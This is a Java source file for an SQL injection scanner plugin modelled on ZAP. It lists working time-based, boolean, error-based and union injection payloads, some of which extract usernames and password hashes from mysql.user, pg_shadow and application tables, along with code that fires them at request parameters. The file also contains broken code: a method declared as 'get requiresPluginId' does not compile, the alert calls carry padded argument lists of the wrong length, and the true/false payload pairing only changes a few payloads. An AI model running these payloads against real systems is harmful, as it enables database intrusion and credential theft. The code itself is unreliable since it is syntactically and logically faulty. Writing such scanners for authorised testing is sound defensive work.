package com.saas_security.security_modules;

import org.parosproxy.paros.core.scanner.*;
import org.parosproxy.paros.network.*;
import org.zaproxy.zap.model.*;
import java.util.*;
import java.sql.Timestamp;

/**
 * Advanced SQL Injection Scanner adapted from ZAP's SQL injection testing capabilities
 */
public class SqlInjectionScanner extends AbstractAppParamPlugin {
    
    private static final int SQL_INJECTION_PLUGIN_ID = 40018; // ZAP's SQL Injection ID
    
    // Time-based SQL injection payloads
    private static final String[] TIME_BASED_PAYLOADS = {
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
        "' UNION SELECT SLEEP(5)-- ",
        "' OR SLEEP(5)-- ",
        "'; WAITFOR DELAY '00:00:05'-- ",
        "' OR SLEEP(5) AND ''='",
        "' AND SLEEP(5) AND '1'='1",
        "' UNION SELECT pg_sleep(5)-- ",
        "';SELECT pg_sleep(5)-- ",
        "' OR pg_sleep(5)-- ",
        "' AND pg_sleep(5)-- ",
        "'; SELECT SLEEP(5); -- ",
        "' OR dbms_lock.sleep(5)-- ",
        "';dbms_lock.sleep(5)-- ",
        "' AND dbms_lock.sleep(5)-- "
    };
    
    // Boolean-based blind SQL injection payloads
    private static final String[] BOOLEAN_PAYLOADS = {
        "' AND '1'='1",
        "' AND '1'='2",
        "' OR '1'='1",
        "' OR '1'='2",
        "') AND ('1')=('1",
        "') AND ('1')=('2",
        "') OR ('1')=('1",
        "') OR ('1')=('2",
        "' UNION SELECT 1-- ",
        "' UNION SELECT 1,2-- ",
        "' UNION SELECT 1,2,3-- ",
        "' UNION SELECT null-- ",
        "' UNION SELECT null,null-- ",
        "' UNION SELECT null,null,null-- ",
        "'; SELECT 1-- ",
        "'; SELECT 1,2-- ",
        "'; SELECT 1,2,3-- "
    };
    
    // Error-based SQL injection payloads
    private static final String[] ERROR_BASED_PAYLOADS = {
        "' AND (SELECT * FROM (SELECT(SELECT COUNT(*)) FROM information_schema.tables)a)-- ",
        "' UNION SELECT COUNT(*) FROM information_schema.tables-- ",
        "' OR (SELECT * FROM (SELECT * FROM(SELECT name_const(@@version,1),name_const(@@version,1),name_const(@@version,1))a)b)-- ",
        "';SELECT @@version-- ",
        "' UNION SELECT @@version-- ",
        "' OR (SELECT COUNT(*) FROM pg_version)-- ",
        "';SELECT version()-- ",
        "' UNION SELECT version()-- ",
        "' OR (SELECT sql FROM sqlite_master)-- ",
        "';SELECT sqlite_version()-- ",
        "' UNION SELECT sqlite_version()-- ",
        "' OR (SELECT * FROM v$version)-- ",
        "';SELECT banner FROM v$version-- ",
        "' UNION SELECT banner FROM v$version-- "
    };
    
    // Union-based SQL injection payloads
    private static final String[] UNION_PAYLOADS = {
        "' UNION SELECT 1,user(),database(),version()-- ",
        "' UNION SELECT user(),password FROM mysql.user-- ",
        "' UNION SELECT table_name FROM information_schema.tables-- ",
        "' UNION SELECT column_name FROM information_schema.columns-- ",
        "' UNION SELECT 1,schema_name FROM information_schema.schemata-- ",
        "' UNION SELECT username,password FROM users-- ",
        "' UNION SELECT email,password FROM customers-- ",
        "' UNION SELECT 1,@@version-- ",
        "' UNION SELECT user(),version()-- ",
        "' UNION SELECT database(),user()-- ",
        "' UNION SELECT current_user,current_database()-- ",
        "' UNION SELECT session_user,system_user-- "
    };
    
    private static final String[] DB_SPECIFIC_PAYLOADS = {
        // MySQL specific
        "' UNION SELECT user,password FROM mysql.user WHERE password!=''-- ",
        "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- ",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_schema=database()-- ",
        "'; SHOW TABLES-- ",
        "'; SHOW DATABASES-- ",
        
        // PostgreSQL specific
        "' UNION SELECT usename,passwd FROM pg_shadow-- ",
        "' UNION SELECT tablename FROM pg_tables-- ",
        "' UNION SELECT attname FROM pg_attribute-- ",
        "';SELECT current_user-- ",
        "';SELECT current_database()-- ",
        
        // SQL Server specific
        "' UNION SELECT name FROM sysobjects WHERE xtype='U'-- ",
        "' UNION SELECT name FROM syscolumns-- ",
        "' UNION SELECT table_name FROM information_schema.tables-- ",
        "'; SELECT @@version-- ",
        "'; SELECT user_name()-- ",
        "'; SELECT db_name()-- ",
        
        // Oracle specific
        "' UNION SELECT username FROM all_users-- ",
        "' UNION SELECT table_name FROM all_tables-- ",
        "' UNION SELECT column_name FROM all_tab_columns-- ",
        "'; SELECT * FROM all_users-- ",
        "'; SELECT table_name FROM all_tables-- "
    };
    
    @Override
    public int getId() {
        return SQL_INJECTION_PLUGIN_ID;
    }
    
    @Override
    public String getName() {
        return "SQL Injection";
    }
    
    @Override
    public String getDescription() {
        return "Advanced SQL injection vulnerability scanner supporting multiple database types and injection techniques";
    }
    
    @Override
    public int get requiresPluginId() {
        return 40004; // SQL Injection Fingerprinting
    }
    
    @Override
    public int getCategory() {
        return Category.INJECTION;
    }
    
    @Override
    public String getSolution() {
        return "Use parameterized queries with prepared statements to prevent SQL injection.";
    }
    
    @Override
    public String getReference() {
        return "https://owasp.org/www-community/attacks/SQL_Injection\nhttps://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html";
    }
    
    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }
    
    @Override
    public int getCweId() {
        return 89; // CWE-89: Improper Neutralization of Special Elements used in an SQL Command
    }
    
    @Override
    public int getWascId() {
        return 19; // WASC-19: SQL Injection
    }
    
    @Override
    public void init() {
        // Plugin initialization
    }
    
    @Override
    public void scan() {
        // Test boolean-based blind SQL injection
        if (testBooleanBasedBlind()) {
            return;
        }
        
        // Test time-based blind SQL injection
        if (testTimeBasedBlind()) {
            return;
        }
        
        // Test error-based SQL injection
        if (testErrorBased()) {
            return;
        }
        
        // Test union-based SQL injection
        if (testUnionBased()) {
            return;
        }
    }
    
    private boolean testBooleanBasedBlind() {
        String paramValue = getBaseMsg().getParamValue(getBaseParamName());
        
        for (String testPayload : BOOLEAN_PAYLOADS) {
            if (isStop()) break;
            
            HttpMessage trueMsg = getNewMsg();
            HttpMessage falseMsg = getNewMsg();
            
            setParameter(trueMsg, getBaseParamName(), paramValue + testPayload, trueMsg.getParamSet());
            setParameter(falseMsg, getBaseParamName(), paramValue + testPayload.replace("=('1", "=('2"), falseMsg.getParamSet());
            
            sendAndReceive(trueMsg);
            sendAndReceive(falseMsg);
            
            if (analyzeBooleanBasedResponse(trueMsg, falseMsg)) {
                raiseBooleanBasedBlindAlert(testPayload);
                return true;
            }
        }
        
        return false;
    }
    
    private boolean testTimeBasedBlind() {
        for (String timePayload : TIME_BASED_PAYLOADS) {
            if (isStop()) break;
            
            long startTime = System.currentTimeMillis();
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), timePayload, msg.getParamSet());
            sendAndReceive(msg);
            
            long responseTime = System.currentTimeMillis() - startTime;
            
            if (responseTime >= 4000 && responseTime <= 7000) { // Check for ~5 second delay
                raiseTimeBasedBlindAlert(timePayload, responseTime);
                return true;
            }
        }
        
        return false;
    }
    
    private boolean testErrorBased() {
        for (String errorPayload : ERROR_BASED_PAYLOADS) {
            if (isStop()) break;
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), errorPayload, msg.getParamSet());
            sendAndReceive(msg);
            
            String responseBody = msg.getResponseBody().toString();
            
            if (checkForSqlError(responseBody)) {
                raiseErrorBasedAlert(errorPayload, responseBody);
                return true;
            }
        }
        
        return false;
    }
    
    private boolean testUnionBased() {
        for (String unionPayload : UNION_PAYLOADS) {
            if (isStop()) break;
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), unionPayload, msg.getParamSet());
            sendAndReceive(msg);
            
            String responseBody = msg.getResponseBody().toString();
            
            if (checkForUnionInjection(responseBody)) {
                raiseUnionBasedAlert(unionPayload, responseBody);
                return true;
            }
        }
        
        return false;
    }
    
    private boolean analyzeBooleanBasedResponse(HttpMessage trueMsg, HttpMessage falseMsg) {
        String trueResponse = trueMsg.getResponseBody().toString();
        String falseResponse = falseMsg.getResponseBody().toString();
        
        // Compare responses for significant differences
        return !trueResponse.equals(falseResponse) && 
               Math.abs(trueResponse.length() - falseResponse.length()) > 10;
    }
    
    private boolean checkForSqlError(String responseBody) {
        String[] sqlErrorPatterns = {
            "mysql_fetch_array",
            "ORA-",
            "Microsoft Jet Database Engine",
            "PostgreSQL query failed",
            "SQLite error",
            "sqlite_master",
            "PostgreSQL query error",
            "SQLiteManager",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: mssql_",
            "mysqli_fetch_array",
            "Warning: sqlite_",
            "PostgreSQL error:",
            "Microsoft JET Database Engine error"
        };
        
        String responseLower = responseBody.toLowerCase();
        for (String pattern : sqlErrorPatterns) {
            if (responseLower.contains(pattern.toLowerCase())) {
                return true;
            }
        }
        
        return false;
    }
    
    private boolean checkForUnionInjection(String responseBody) {
        // Check for database information that might be disclosed
        String[] dbInfoPatterns = {
            "MySQL Database",
            "PostgreSQL",
            "SQL Server",
            "Oracle",
            "SQLite",
            "current_user",
            "current_database",
            "version()",
            "@@version",
            "pg_version",
            "sqlite_version"
        };
        
        String responseLower = responseBody.toLowerCase();
        int matches = 0;
        for (String pattern : dbInfoPatterns) {
            if (responseLower.contains(pattern.toLowerCase())) {
                matches++;
            }
        }
        
        return matches >= 2; // Multiple database info indicators
    }
    
    private void raiseBooleanBasedBlindAlert(String payload) {
        Alert alert = new Alert(getRisk(), Alert.CONFIDENCE_HIGH, getName());
        alert.setDetail(getDescription(),
                       getBaseMsg().getRequestHeader().getURI().toString(),
                       getParameterName(getBaseMsg()),
                       payload,
                       "", "", "", "", "", "", "", "", "", "", "");
        alert.setCweId(getCweId());
        alert.setWascId(getWascId());
        alert.setSolution(getSolution());
        alert.setReference(getReference());
        
        raiseAlert(getRisk(), Alert.CONFIDENCE_HIGH, getName(), getDescription(),
                  getBaseMsg().getRequestHeader().getURI().toString(),
                  getParameterName(getBaseMsg()), payload, "", "", "", "", "", "", "", "");
    }
    
    private void raiseTimeBasedBlindAlert(String payload, long responseTime) {
        Alert alert = new Alert(getRisk(), Alert.CONFIDENCE_HIGH, getName());
        alert.setDetail(getDescription() + " (Time-based blind)",
                       getBaseMsg().getRequestHeader().getURI().toString(),
                       getParameterName(getBaseMsg()),
                       payload + " (Response time: " + responseTime + "ms)",
                       "", "", "", "", "", "", "", "", "", "", "");
        alert.setCweId(getCweId());
        alert.setWascId(getWascId());
        alert.setSolution(getSolution());
        alert.setReference(getReference());
        
        raiseAlert(getRisk(), Alert.CONFIDENCE_HIGH, getName(), 
                  getDescription() + " (Time-based blind)",
                  getBaseMsg().getRequestHeader().getURI().toString(),
                  getParameterName(getBaseMsg()), payload, "", "", "", "", "", "", "", "");
    }
    
    private void raiseErrorBasedAlert(String payload, String responseBody) {
        Alert alert = new Alert(getRisk(), Alert.CONFIDENCE_HIGH, getName());
        alert.setDetail(getDescription() + " (Error-based)",
                       getBaseMsg().getRequestHeader().getURI().toString(),
                       getParameterName(getBaseMsg()),
                       payload,
                       "", "", responseBody, "", "", "", "", "", "", "", "");
        alert.setCweId(getCweId());
        alert.setWascId(getWascId());
        alert.setSolution(getSolution());
        alert.setReference(getReference());
        
        raiseAlert(getRisk(), Alert.CONFIDENCE_HIGH, getName(),
                  getDescription() + " (Error-based)",
                  getBaseMsg().getRequestHeader().getURI().toString(),
                  getParameterName(getBaseMsg()), payload, "", "", responseBody, "", "", "", "", "");
    }
    
    private void raiseUnionBasedAlert(String payload, String responseBody) {
        Alert alert = new Alert(getRisk(), Alert.CONFIDENCE_HIGH, getName());
        alert.setDetail(getDescription() + " (Union-based)",
                       getBaseMsg().getRequestHeader().getURI().toString(),
                       getParameterName(getBaseMsg()),
                       payload,
                       "", "", responseBody, "", "", "", "", "", "", "", "");
        alert.setCweId(getCweId());
        alert.setWascId(getWascId());
        alert.setSolution(getSolution());
        alert.setReference(getReference());
        
        raiseAlert(getRisk(), Alert.CONFIDENCE_HIGH, getName(),
                  getDescription() + " (Union-based)",
                  getBaseMsg().getRequestHeader().getURI().toString(),
                  getParameterName(getBaseMsg()), payload, "", "", responseBody, "", "", "", "", "");
    }
    
    @Override
    public boolean isStop() {
        return super.isStop();
    }
}
